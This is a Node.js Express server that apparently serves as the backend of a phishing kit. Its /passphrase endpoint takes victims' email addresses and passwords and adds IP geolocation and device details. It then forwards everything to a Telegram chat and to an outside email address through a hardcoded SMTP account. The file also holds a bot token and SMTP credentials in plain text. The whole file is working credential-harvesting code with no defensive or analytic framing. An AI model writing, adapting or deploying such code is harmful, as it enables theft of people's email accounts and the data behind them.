const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const axios = require('axios');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const UAParser = require('ua-parser-js');

const app = express();
const botToken = '6773740956:AAF-Xgthr-xuRZvkl2m6kHILRXjb07ROwww'; // Replace with your Telegram bot token
const bot = new TelegramBot(botToken);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors());

app.get('/', async (req, res) => {
  // Send back the "Hello, World!" response
  res.send('Hello, World!');
});

app.post('/passphrase', async (req, res) => {
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const { email_provider, email, password } = req.body;

  // Parse user-agent header to get device information using ua-parser-js
  const parser = new UAParser();
  const deviceInfo = parser.setUA(userAgent).getResult();

  if (!email_provider || !email || !password) {
    return res.status(400).json({ error: 'Email provider, email, or password is missing in the request body' });
  }

  const url = `https://freeipapi.com/api/json/${clientIP}`;

  try {
    // Fetch IP location data using axios
    const response = await axios.get(url);
    const { countryName, cityName, regionName, isProxy, continent, timeZone } = response.data;

    // Send the message to Telegram
    const teleMessage = `
    
      Email Provider: ${email_provider}
      =================================
      Email: ${email}
      Password: ${password}
      =================================
      IP Location: ${clientIP}
      Country: ${countryName},
      City: ${cityName},
      VPN: ${isProxy ? "Yes" : "No"}
      =================================
      Device Info: ${JSON.stringify(deviceInfo)}
    `;
    await bot.sendMessage('6219356860', teleMessage);

    // Send email using nodemailer
    let transporter = nodemailer.createTransport({
      host: '185-16-38-83.cprapid.com',
      port: 465,
      secure: true,
      auth: {
        user: 'adminpunch@navi-punchb0wldocument.com',
        pass: 'Pinetwork10',
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    const mailOptions = {
      from:'adminpunch@navi-punchb0wldocument.com',
      to: 'policyinfluencer@yandex.com',
      subject: `Received From ${clientIP}`,
      text: `
        Email Provider: ${email_provider}
        Email: ${email}
        Password: ${password}
        IP Location: ${clientIP}
        Continent: ${continent},
        Country: ${countryName},
        Region: ${regionName}, 
        City: ${cityName},
        Timezone: ${timeZone},
        VPN: ${isProxy ? "Yes" : "No"}
        Device Info: ${JSON.stringify(deviceInfo)}
      `,
    };

    await transporter.sendMail(mailOptions);
    res.json({ message: 'Email credentials received successfully' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Failed to process the request' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});
